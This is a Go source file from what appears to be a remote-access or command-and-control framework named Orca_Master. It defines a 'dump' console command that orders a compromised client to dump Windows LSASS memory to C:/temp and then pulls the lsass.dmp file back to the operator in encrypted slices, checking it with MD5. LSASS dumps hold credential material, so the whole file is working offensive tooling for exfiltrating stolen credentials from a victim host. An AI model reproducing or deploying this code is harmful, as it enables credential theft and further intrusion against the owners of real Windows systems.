package controller

import (
	"Orca_Master/cli/cmdopt/fileopt"
	"Orca_Master/cli/common"
	"Orca_Master/define/colorcode"
	"Orca_Master/define/config"
	"Orca_Master/define/retcode"
	"Orca_Master/tools/crypto"
	"fmt"
	"github.com/desertbit/grumble"
	"os"
	"strconv"
	"time"
)

var dumpCmd = &grumble.Command{
	Name:  "dump",
	Help:  "extract the lsass.dmp",
	Usage: "close [-h | --help]",
	Run: func(c *grumble.Context) error {
		timeStr := strconv.FormatInt(time.Now().Unix(), 10)
		data, _ := crypto.Encrypt([]byte(timeStr), []byte(config.AesKey))
		retData := common.SendSuccessMsg(SelectClientId, common.ClientId, "dump", data, "")
		if retData.Code != retcode.SUCCESS {
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "get info request failed")
			return nil
		}
		var retCode int
		select {
		case msg := <-common.DefaultMsgChan:
			retCode = common.GetHttpRetCode(msg)

			outputMsg, _ := crypto.Decrypt(common.GetHttpRetData(msg), []byte(config.AesKey))
			fmt.Println(outputMsg)
		case <-time.After(20 * time.Second):
			colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
			return nil
		}
		// 下载dmp
		if retCode == retcode.SUCCESS {
			remoteFile := fmt.Sprintf("C:/temp/%s.dmp", timeStr)
			localFile := "lsass.dmp"
			// 发送下载文件请求
			retData := fileopt.SendDownloadRequestMsg(SelectClientId, common.ClientId, remoteFile, localFile)
			if retData.Code != retcode.SUCCESS {
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "download request failed")
				return nil
			}
			// 接收消息，显示是否可以下载文件
			var requestFileMsg string
			select {
			case requestFileMsg = <-common.DefaultMsgChan:
				if common.GetHttpRetCode(requestFileMsg) != retcode.SUCCESS {
					return fmt.Errorf(common.GetHttpRetMsg(requestFileMsg))
				}
			case <-time.After(10 * time.Second):
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "request timed out")
				return nil
			}
			colorcode.PrintMessage(colorcode.SIGN_NOTICE, "lsass.dmp downloading...")
			// 下载文件元信息
			fileMetaInfo := fileopt.GetMetaInfo(requestFileMsg)
			sliceNum := fileMetaInfo.SliceNum
			md5sum := fileMetaInfo.Md5sum
			pSaveFile, _ := os.OpenFile(localFile, os.O_CREATE|os.O_RDWR, 0600)
			defer pSaveFile.Close()

			// 循环从管道中获取文件元数据并写入
			for i := 0; i < sliceNum+1; i++ {
				var err error
				select {
				case metaData := <-common.FileSliceMsgChan:
					_, err = pSaveFile.Write(metaData)
				case <-time.After(8 * time.Second):
					colorcode.PrintMessage(colorcode.SIGN_FAIL, "lsass.dmp download failed")
					return nil
				}
				if err != nil {
					break
				}
			}
			// 文件md5校验
			saveFileMd5 := fileopt.GetFileMd5Sum(localFile)
			if md5sum == saveFileMd5 {
				colorcode.PrintMessage(colorcode.SIGN_SUCCESS, "lsass.dmp download success")
			} else {
				colorcode.PrintMessage(colorcode.SIGN_FAIL, "lsass.dmp download failed")
			}
		}
		time.Sleep(100 * time.Millisecond)
		return nil
	},
}
